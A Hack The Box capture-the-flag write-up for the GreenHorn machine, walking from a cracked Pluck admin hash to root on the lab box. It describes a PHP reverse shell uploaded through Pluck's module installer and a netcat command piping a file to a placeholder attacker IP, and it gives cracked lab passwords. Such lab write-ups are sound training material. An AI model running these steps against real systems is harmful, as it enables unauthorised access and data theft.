# HTB_GreenHorn

# GreenHorn Writeup

## Synopsis

GreenHorn is an easy difficulty machine that takes advantage of an exploit in Pluck to achieve Remote Code Execution and then demonstrates the dangers of pixelated credentials. The machine also showcases that we must be careful when sharing open-source configurations to ensure that we do not reveal files containing passwords or other information that should be kept confidential.

## Skills Required

* Basic Enumeration
* Basic Hash Cracking

## Skills Learned

* RCE through Pluck
* Credential Depixelization

## Enumeration

### Nmap

```bash
nmap -sC -sV 10.10.11.25
```

**Nmap Scan Report:**

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-17 17:43 EEST
Nmap scan report for 10.10.11.25
Host is up (0.060s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                  
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)                 
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519) 
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://greenhorn.htb/
3000/tcp open  ppp?
Nmap done: 1 IP address (1 host up) scanned in 10.75 seconds
```

An initial Nmap scan reveals the open ports: 22/OpenSSH, 80/HTTP, and 3000/Gitea. Additionally, we also identify the domain `greenhorn.htb` corresponding to the web server being hosted on port 80.

We must first add it to our hosts file at `/etc/hosts`, this will resolve the connection between the IP address and the hostname `greenhorn.htb` allowing us to be redirected to the site. Then we should be able to continue our enumeration by viewing the webpage.

```bash
echo "10.10.11.25 greenhorn.htb" | sudo tee -a /etc/hosts
```

### HTTP

Visiting the website on port 80 reveals that it is powered by Pluck. Pluck is a content management system written in PHP that helps create and manage websites. Searching through the website reveals an admin login page under the admin link at the bottom of the landing page. To log in we will have to continue our enumeration to find the password. The page also reveals the version of Pluck is 4.7.18, which will come in handy later.

### Gitea

Next, we will look at the Gitea page hosted on port 3000. By navigating to `10.10.11.25:3000` we click Explore at the top left and find the repository called GreenHorn. The repository contains the configuration files for the main website hosted by Pluck. If we open the `login.php` file we can find the location of the file that might contain the password for the admin. The login file reveals that the password hash is saved under `data/settings/pass.php` but also that the hash type is sha512.

If we navigate through the repository to the aforementioned file path, we can find the admin password hash.

### John the Ripper

To crack the hash we found, we save it in a file on our machine and then use John the Ripper. With the knowledge from the `login.php` file, we know the hash type is sha512. The password for the admin account is revealed to be `iloveyou1`.

```bash
echo "d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163" > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA512 hash.txt
```

**John the Ripper Output:**

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 128/128 ASIMD 2x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyou1        (?)
1g 0:00:00:00 DONE (2024-07-30 12:47) 50.00g/s 6553Kp/s 6553Kc/s 6553KC/s 
123456..kovacs
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Foothold

### RCE

As we now have the admin password we can log in to the Pluck website. We can see the version of Pluck at the bottom of the page again prompting us to do some research and see if there are any exploits related to the version 4.7.18. We find we can achieve Remote Code Execution by uploading a reverse PHP shell into the install modules function. We will go ahead and do it manually instead of using the script.

First, we will navigate to 


Install a module, which can be found under `options > manage modules`.

We can use the basic PHP shell from pentestmonkey and rename it to something shorter like `shell.php`. Make sure to open it and change the following attributes where prompted: your IP Address and the port number you want the reverse connection to be on.

```php
$ip = '<YOURIPADDRESS>';  // CHANGE THIS
$port = <PORT>;          // CHANGE THIS
```

If we try to upload the `shell.php` directly into the install modules page we are refused due to incorrect file type. Therefore, we will have to zip our shell first and then try re-uploading.

```bash
zip shell.zip shell.php
```

Before we upload the file we should set up our listener on Netcat using the port we specified in the `shell.php`.

```bash
nc -lvnp <PORT>
```

**Example Netcat Listener Output:**

```
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.25] 41086
Linux greenhorn 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 11:00:30 up  2:11,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Now we can proceed to upload the `shell.zip` and trigger it by navigating to `http://greenhorn.htb/data/modules/shell/shell.php` in our browser. We should see a response from our active listener.

To make the shell more interactive we can use the following script. The `script` command will create a new script session and run a new instance of `/bin/bash`. Essentially it will create a new pseudo-terminal (PTY) that will be more responsive and stable while also ensuring that any output of our terminal is discarded as we pass it to `/dev/null`. As we see in our execution of the command `id` below, we have opened a shell as `www-data`.

```bash
script /dev/null -c /bin/bash
```

**Interactive Shell Output:**

```
Script started, output log file is '/dev/null'.
www-data@greenhorn:/$ 
www-data@greenhorn:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

Now that we have a shell we can explore a bit. By navigating through the file system we can find that there is a user `junior` who was also mentioned on the main website. Assuming that `junior` might use the same password in multiple places we can attempt to switch users with the password `iloveyou1`.

```bash
su junior
```

**Switch User Output:**

```
www-data@greenhorn:/$ su junior
Password: iloveyou1
junior@greenhorn:/$
```

Our attempt was successful as we now have a session as `junior` and can navigate to his home directory to find the user flag.

```bash
cd /home/junior
ls -la
cat user.txt
```

**Junior Home Directory Listing:**

```
total 76
drwxr-xr-x 3 junior junior  4096 Jun 20 06:36  .
drwxr-xr-x 4 root   root    4096 Jun 20 06:36  ..
lrwxrwxrwx 1 junior junior     9 Jun 11 14:38  .bash_history -> /dev/null
drwx------ 2 junior junior  4096 Jun 20 06:36  .cache
-rw-r----- 1 root   junior    33 Jul 30 08:56  user.txt
-rw-r----- 1 root   junior 61367 Jun 11 14:39 'Using OpenVAS.pdf'
```

## Privilege Escalation

Also in `junior`'s home directory is the pdf file `Using OpenVAS.pdf`. To read it we will have to transfer it to our machine and we can do so using Netcat. First, we will open a Netcat listener on our local machine on a different port from our shell.

```bash
nc -lvnp <PORT> > 'Using OpenVAS.pdf'
```

Then we can send the file over from `junior`'s terminal. Essentially we are reading the file content and through the Netcat connection, we 'write' it to the file we specify with the same name on our local machine.

```bash
cat 'Using OpenVAS.pdf' | nc <YOURIPADDRESS> <PORT>
```

When it finishes transferring, we can close the listening connection which should also terminate the Netcat command on `junior`'s terminal. Opening the pdf reveals that the admin has shared his password with `junior` so that he can use OpenVAS with admin privileges. However, the password is pixelated and unreadable. If we search for a way to unpixelate credentials we will find this tool: Depix. It will attempt to decode the pixelated blocks of plain text by matching them to reference photos included in the repository.

Clone the git repository and navigate into the folder.

```bash
git clone https://github.com/spipm/Depix.git
cd Depix
```

Before we can use the tool we will have to create an image file that contains only the pixelated credentials and excludes the rest of the text in the pdf. By right-clicking on the pixelated image in the pdf we can save it on our machine as `image.png`.

Now we can execute the depixelization tool with the following command:

```bash
python3 depix.py -p <PATHTOIMAGE>/image.png -s ./images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o <DESIREDPATH>/output.png
```

We have found that the hidden password was `sidefromsidetheothersidesidefromsidetheotherside`. Now we can try to use this to escalate our privileges and switch to the root user account.

```bash
su root
```

**Root Login Output:**

```
junior@greenhorn:~$ su root
Password: sidefromsidetheothersidesidefromsidetheotherside
root@greenhorn:/home/junior# 
```

We have successfully gotten a session as root and can navigate to the root directory to find the root flag!

```bash
cat /root/root.txt
```

## Screenshots




![Page 1](https://private-us-east-1.manuscdn.com/sessionFile/ZKm01tyNcWWWxeti1OiA3F/sandbox/aD9T8qHETPtStcVBnjKeql-images_1753959111742_na1fn_L2hvbWUvdWJ1bnR1L2V4dHJhY3RlZF9pbWFnZXMvcGFnZV8x.png?Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9wcml2YXRlLXVzLWVhc3QtMS5tYW51c2Nkbi5jb20vc2Vzc2lvbkZpbGUvWkttMDF0eU5jV1dXeGV0aTFPaUEzRi9zYW5kYm94L2FEOVQ4cUhFVFB0U3RjVkJuaktlcWwtaW1hZ2VzXzE3NTM5NTkxMTE3NDJfbmExZm5fTDJodmJXVXZkV0oxYm5SMUwyVjRkSEpoWTNSbFpGOXBiV0ZuWlhNdmNHRm5aVjh4LnBuZyIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTc5ODc2MTYwMH19fV19&Key-Pair-Id=K2HSFNDJXOU9YS&Signature=mFgsPSDyCJEqqccFZsVUxj9nuuslpPukRkVyL53YVjZH7bqFblVOtaAN~OtvDVHeI-lHq5shmNituclWPMNDi5315Q2OlAQlpnVYBalW4chs4ncczWw2BppTvH-jLqCwtP52JUexEzsib-JrwFN6VyLrQmCt4V-3jHvIheSLKTlPSufwCjDZjdxe-bD-fM~gegjDGCZl7G7Yg~JijSoBOKhiVDiWM3NZ6~lodTnHYS-uac~F8PHFuC~GO4SjDi~umskhS-ONOxvLWVDlogZuzsQ-VfrQS-F~3Sz27F9bUMTUyAvwz7Xgy6ztTg0JzDrPrS0~EFjcAEbkqFDF52AfmA__)
![Page 2](https://private-us-east-1.manuscdn.com/sessionFile/ZKm01tyNcWWWxeti1OiA3F/sandbox/aD9T8qHETPtStcVBnjKeql-images_1753959111743_na1fn_L2hvbWUvdWJ1bnR1L2V4dHJhY3RlZF9pbWFnZXMvcGFnZV8y.png?Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9wcml2YXRlLXVzLWVhc3QtMS5tYW51c2Nkbi5jb20vc2Vzc2lvbkZpbGUvWkttMDF0eU5jV1dXeGV0aTFPaUEzRi9zYW5kYm94L2FEOVQ4cUhFVFB0U3RjVkJuaktlcWwtaW1hZ2VzXzE3NTM5NTkxMTE3NDNfbmExZm5fTDJodmJXVXZkV0oxYm5SMUwyVjRkSEpoWTNSbFpGOXBiV0ZuWlhNdmNHRm5aVjh5LnBuZyIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTc5ODc2MTYwMH19fV19&Key-Pair-Id=K2HSFNDJXOU9YS&Signature=Bz1Kx10YwcPwWCkzg7H-7zGgRE8Dbf-kxHYo2i4mDoVtpeJDBCGNvTzxvqLlh-SJ4JXBJP7M76v5soDM542CRQasTlkVr63qR5QQxrkZK-NrdqJ7lV7K~shHdE5~PNSj0tNVKYzj985Guyb5dJj4ls~7Sy2cKgXnjPFGAHuIWnsgXAr6pi09x3dZMZIMhLg7GTrcOXIHi5k~mEM2g5PlezwPMUYoruricyUxwdazMNCgWYvU1swwF8gqYADcjJRWbGVnQt~r0NFc7ogS9ujn-itcJ8OYIbwA9lnxfTbykLzJdSXFY1bhsCGwwuss0O7pJ69d5G4Li89~VQk-n5-0jg__)
![Page 3](https://private-us-east-1.manuscdn.com/sessionFile/ZKm01tyNcWWWxeti1OiA3F/sandbox/aD9T8qHETPtStcVBnjKeql-images_1753959111743_na1fn_L2hvbWUvdWJ1bnR1L2V4dHJhY3RlZF9pbWFnZXMvcGFnZV8z.png?Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9wcml2YXRlLXVzLWVhc3QtMS5tYW51c2Nkbi5jb20vc2Vzc2lvbkZpbGUvWkttMDF0eU5jV1dXeGV0aTFPaUEzRi9zYW5kYm94L2FEOVQ4cUhFVFB0U3RjVkJuaktlcWwtaW1hZ2VzXzE3NTM5NTkxMTE3NDNfbmExZm5fTDJodmJXVXZkV0oxYm5SMUwyVjRkSEpoWTNSbFpGOXBiV0ZuWlhNdmNHRm5aVjh6LnBuZyIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTc5ODc2MTYwMH19fV19&Key-Pair-Id=K2HSFNDJXOU9YS&Signature=T7cu2CnyohiEiydDmHAZkwPod9fOpAFtIJoUNPjIKBZ4t1Xpe0uhp0laXVDAEsVH7OsuUYNFChd~JeMaNJM7Uf2OI8Oc1~~GOSdyribgE-bD4b2fXyL1gm8SDUIPR~Ku8E7mx2lE5IONlSrsZ3pKQdBR9-GbDbpyuyvq689ah0idLQ-ydE9zBTpmlbsCcL23MaMGLWxQW4~cJD77NDycRWWOGw6QXjDtCbKBsGk6xSR-xNyl5NDLw7BCK~k76aLHa2dEDcg4Jg7XF6E4s-Fgq935t2X3g19qcza-ZSu3cr~XEQQBwgp75J0YCZJdlI4p-xDr9rbtrBmzW1jVoZHrwg__)
![Page 4](https://private-us-east-1.manuscdn.com/sessionFile/ZKm01tyNcWWWxeti1OiA3F/sandbox/aD9T8qHETPtStcVBnjKeql-images_1753959111743_na1fn_L2hvbWUvdWJ1bnR1L2V4dHJhY3RlZF9pbWFnZXMvcGFnZV80.png?Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9wcml2YXRlLXVzLWVhc3QtMS5tYW51c2Nkbi5jb20vc2Vzc2lvbkZpbGUvWkttMDF0eU5jV1dXeGV0aTFPaUEzRi9zYW5kYm94L2FEOVQ4cUhFVFB0U3RjVkJuaktlcWwtaW1hZ2VzXzE3NTM5NTkxMTE3NDNfbmExZm5fTDJodmJXVXZkV0oxYm5SMUwyVjRkSEpoWTNSbFpGOXBiV0ZuWlhNdmNHRm5aVjgwLnBuZyIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTc5ODc2MTYwMH19fV19&Key-Pair-Id=K2HSFNDJXOU9YS&Signature=tGRjdzy4M1ZETrBvBkkdN1wY1iO7jHsBNJJjUkh1Fatcu0AJSIKue~ch2Wix0RBtwQZMNVnFDipSQbfu1O2CowyUCgxgffs8gQzGh-0MFgRW-3BOcVrE35TD8IARFDBR2kdeXUQ3EzRanX25ahY1hdz6XXlhycBTE8t~DksgfjbK-2Kr5tR4EDtg8g4Og5U~6T~k3di9-g~Qryw-mcrAcTUi0RDJ1VDC4lJrMTe5FHXWt1HjysY-jKFkbOGyMoB1jsYQX9iUX2JgSU933M5uEanoaGXER-xFmoV9NFxfvFp~mSiNfWv1eLMCcDghaF5jyaxFDgCQSM6~WHffYQMy2A__)
![Page 5](https://private-us-east-1.manuscdn.com/sessionFile/ZKm01tyNcWWWxeti1OiA3F/sandbox/aD9T8qHETPtStcVBnjKeql-images_1753959111744_na1fn_L2hvbWUvdWJ1bnR1L2V4dHJhY3RlZF9pbWFnZXMvcGFnZV81.png?Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9wcml2YXRlLXVzLWVhc3QtMS5tYW51c2Nkbi5jb20vc2Vzc2lvbkZpbGUvWkttMDF0eU5jV1dXeGV0aTFPaUEzRi9zYW5kYm94L2FEOVQ4cUhFVFB0U3RjVkJuaktlcWwtaW1hZ2VzXzE3NTM5NTkxMTE3NDRfbmExZm5fTDJodmJXVXZkV0oxYm5SMUwyVjRkSEpoWTNSbFpGOXBiV0ZuWlhNdmNHRm5aVjgxLnBuZyIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTc5ODc2MTYwMH19fV19&Key-Pair-Id=K2HSFNDJXOU9YS&Signature=f~1OQ8MHx1qzRv~qQW8UzFQ-RlmBlAFdm5Znl2hGzAWciKilGlK0~-HOskek8QT8Cx4aezzz6MTIw1CUwih11uFXmKPZKTm5yGnBMDMyvSAxEEgur2hWDBmjFjIG3Puwd4SOWkm56n1DFbluP1j4SvqVhMsWRxOTeQEutH9KHw8ZSZNeXbHvTK8Owyw8NrONKJy1NjoHb5EShWxSiXg04HeownSGyL72x1Hhndwyyc6n4gujwclNW7vQzTVB5BsVvbKj46nkX34uiznYN8W7aPIEHw3Uwe~5wWqFZK1BfAPSbZGaixNxcAkXCy2pi8roKAXaO8CtVCncZhi~hybBaA__)
![Page 6](https://private-us-east-1.manuscdn.com/sessionFile/ZKm01tyNcWWWxeti1OiA3F/sandbox/aD9T8qHETPtStcVBnjKeql-images_1753959111744_na1fn_L2hvbWUvdWJ1bnR1L2V4dHJhY3RlZF9pbWFnZXMvcGFnZV82.png?Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9wcml2YXRlLXVzLWVhc3QtMS5tYW51c2Nkbi5jb20vc2Vzc2lvbkZpbGUvWkttMDF0eU5jV1dXeGV0aTFPaUEzRi9zYW5kYm94L2FEOVQ4cUhFVFB0U3RjVkJuaktlcWwtaW1hZ2VzXzE3NTM5NTkxMTE3NDRfbmExZm5fTDJodmJXVXZkV0oxYm5SMUwyVjRkSEpoWTNSbFpGOXBiV0ZuWlhNdmNHRm5aVjgyLnBuZyIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTc5ODc2MTYwMH19fV19&Key-Pair-Id=K2HSFNDJXOU9YS&Signature=ghSA~eAeMWJwBiRUr1Hltc26e2Kn88QvezzWpHqyr5ip81zREOoclQVytDl8pIaM0qxoN5IifPJ3cBsQHGTysN3n5i~SNUyOUrmuBdW0~0xw9xFU377sSp89P-S~WAGkXU70CFAM1~3-eXQfnGmcxBu4VSztYrPxjxBrsRdBI1eyOLVyD-fcnRGz72ZcKhupGdyXuX6SCTqovuQX5g7iVUPK-PvL5D1lZrlKI07bJE5H4bIrf3hnwsPzLLdMWAFww14-UcuFiHFcl9VT5LJ8xpSP-VTnLDeeOh4~3m2mTg98t0PbKC7QE8lY4wNx-TuZQ-OrTD-zgGNwpJ6b-Qoq-g__)
![Page 7](https://private-us-east-1.manuscdn.com/sessionFile/ZKm01tyNcWWWxeti1OiA3F/sandbox/aD9T8qHETPtStcVBnjKeql-images_1753959111745_na1fn_L2hvbWUvdWJ1bnR1L2V4dHJhY3RlZF9pbWFnZXMvcGFnZV83.png?Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9wcml2YXRlLXVzLWVhc3QtMS5tYW51c2Nkbi5jb20vc2Vzc2lvbkZpbGUvWkttMDF0eU5jV1dXeGV0aTFPaUEzRi9zYW5kYm94L2FEOVQ4cUhFVFB0U3RjVkJuaktlcWwtaW1hZ2VzXzE3NTM5NTkxMTE3NDVfbmExZm5fTDJodmJXVXZkV0oxYm5SMUwyVjRkSEpoWTNSbFpGOXBiV0ZuWlhNdmNHRm5aVjgzLnBuZyIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTc5ODc2MTYwMH19fV19&Key-Pair-Id=K2HSFNDJXOU9YS&Signature=bk7el1bxJkY0W-nzWeaURafepJQQ2lX36dl9mNO7LSqUT65hlo~LeoFNJYlVw7hJHDmb7P6-Szd-jygCi97QN-zqV3AlXnWj0OBolemG-nDcNzTR2AMWiGQT3aE9N82BxegxJWd311U3mTsZ-~za1OdQaC209lCskynFjglI6lLN107PO~6siR8dAwuE6nS7NrIu35MQ67mEW20bulJ1cwuXEhNbnfHltJptuXGaUv9sByXrhHivcQs0RCtBCJ7-jI5ACzktcclWQm05YpMNDIdq8gV~a6ndxFW5v65~7-WqeOHYQAh070eD~gpFuaqjWLgsV2zscqkGwxBxcNrBxQ__)
![Page 8](https://private-us-east-1.manuscdn.com/sessionFile/ZKm01tyNcWWWxeti1OiA3F/sandbox/aD9T8qHETPtStcVBnjKeql-images_1753959111745_na1fn_L2hvbWUvdWJ1bnR1L2V4dHJhY3RlZF9pbWFnZXMvcGFnZV84.png?Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9wcml2YXRlLXVzLWVhc3QtMS5tYW51c2Nkbi5jb20vc2Vzc2lvbkZpbGUvWkttMDF0eU5jV1dXeGV0aTFPaUEzRi9zYW5kYm94L2FEOVQ4cUhFVFB0U3RjVkJuaktlcWwtaW1hZ2VzXzE3NTM5NTkxMTE3NDVfbmExZm5fTDJodmJXVXZkV0oxYm5SMUwyVjRkSEpoWTNSbFpGOXBiV0ZuWlhNdmNHRm5aVjg0LnBuZyIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTc5ODc2MTYwMH19fV19&Key-Pair-Id=K2HSFNDJXOU9YS&Signature=UUlE5wIK1tw9M9Od9nDMwlhh~vjdFuzHmWiHUgbuc3DiR0wp7HK~~aPQ4px5C8v5NRaZ6TFwfE0OKOKQWELmeT9eU-nJHoK0oFJBTTAHlpA~e5jJVs851tGdOUasqdY5spaq0HbcmSX5IwiADMTCI0RdYem2h1c3jFMY~BHzDYkg0JtpjdSOcZP8JplQ4mRV7olKlc3nOVmX5V6C2EY4PUurDxwb-Y0FGpJN9OupaDCscPnbMs73sijWtsrOpfuK4HSmqa4s4EC1Wdi6pgEoevYbxZGB1fNm5HJZ19aOPTEfxsjLjIRtEieoxaC5B9oeqtLrDexCAkWoZQgFwMigQQ__)
![Page 9](https://private-us-east-1.manuscdn.com/sessionFile/ZKm01tyNcWWWxeti1OiA3F/sandbox/aD9T8qHETPtStcVBnjKeql-images_1753959111745_na1fn_L2hvbWUvdWJ1bnR1L2V4dHJhY3RlZF9pbWFnZXMvcGFnZV85.png?Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9wcml2YXRlLXVzLWVhc3QtMS5tYW51c2Nkbi5jb20vc2Vzc2lvbkZpbGUvWkttMDF0eU5jV1dXeGV0aTFPaUEzRi9zYW5kYm94L2FEOVQ4cUhFVFB0U3RjVkJuaktlcWwtaW1hZ2VzXzE3NTM5NTkxMTE3NDVfbmExZm5fTDJodmJXVXZkV0oxYm5SMUwyVjRkSEpoWTNSbFpGOXBiV0ZuWlhNdmNHRm5aVjg1LnBuZyIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTc5ODc2MTYwMH19fV19&Key-Pair-Id=K2HSFNDJXOU9YS&Signature=ZeeO0SpoUmLRHx0A-VPUL6zfVbZuNJ4oHzigHyERu7YGM-0kKXmYm1jEGK1N72XICHCJfoOQ5RV28gwWKHGz8Z3u~AAbw89XiqTyMJNNxepRwlt16pYJym2vsS-69upTyFjX0FHOVJlzngIY77NY6GtBkD3k-e1LnrsT8~H7yl-I8N1FP-6IjrqKABwaAzjnGhTTF1J4ca4PdyA6qJc5FDnJO0I8K~FRW7cuDWbLsCMXKuUfOnopyGXq3WM6KZfWLVYOdIpOEsdYnfXw~iZ8XWnMLEZq2ZC38PS0TaPWPSmDndbAW6dCM4za-JEfuNrxmEFILEHNt33J~xk5JIUVsQ__)
![Page 10](https://private-us-east-1.manuscdn.com/sessionFile/ZKm01tyNcWWWxeti1OiA3F/sandbox/aD9T8qHETPtStcVBnjKeql-images_1753959111748_na1fn_L2hvbWUvdWJ1bnR1L2V4dHJhY3RlZF9pbWFnZXMvcGFnZV8xMA.png?Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9wcml2YXRlLXVzLWVhc3QtMS5tYW51c2Nkbi5jb20vc2Vzc2lvbkZpbGUvWkttMDF0eU5jV1dXeGV0aTFPaUEzRi9zYW5kYm94L2FEOVQ4cUhFVFB0U3RjVkJuaktlcWwtaW1hZ2VzXzE3NTM5NTkxMTE3NDhfbmExZm5fTDJodmJXVXZkV0oxYm5SMUwyVjRkSEpoWTNSbFpGOXBiV0ZuWlhNdmNHRm5aVjh4TUEucG5nIiwiQ29uZGl0aW9uIjp7IkRhdGVMZXNzVGhhbiI6eyJBV1M6RXBvY2hUaW1lIjoxNzk4NzYxNjAwfX19XX0_&Key-Pair-Id=K2HSFNDJXOU9YS&Signature=v7sJoBFwXnAr5Wq03Dl6lCEBgiQm5wCBDXTICvVcZgHXYf7cdRQxmn~v4yc9I5WAnTdmiGualonQzCw~CEfiX4hBOdOoHI2RRby03L9ELkivEAipd4VHQdpd4UKu5oDQHIrUq9XwHMwFPGC2LivVS0~FH1DaGkxyjA~sdNyfOF6NT2izEE4kZf8LoZsALmVnI5TnatB-yIOa7DQob4ICd~BVPuwqScfaxO70ShKoIdEnIyUd2xtkS009bYnSFmC0a3fTI3B6rVxx~AgasIxT0hWn-swlBUDarGIEOc6FA0jo0gZeAqn8p~8GONm9NaRn2vgvDFuh2X6vftXS85-BvQ__)


